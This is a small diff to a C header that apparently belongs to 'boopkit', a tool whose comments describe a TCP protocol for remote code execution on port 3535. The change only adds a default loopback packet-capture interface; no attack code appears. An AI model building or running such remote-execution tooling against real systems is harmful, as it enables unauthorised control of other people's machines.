@@ -51,6 +51,8 @@ struct event_boop_t {
 // PORT for the boopkit TCP protocol for boopscript RCE
 #define PORT 3535
 
+#define DEFAULT_PCAP_INTERFACE "lo"
+
 // MAX_DENY_ADDRS is the maximum amount of address that can be denied.
 #define MAX_DENY_ADDRS 1024
 
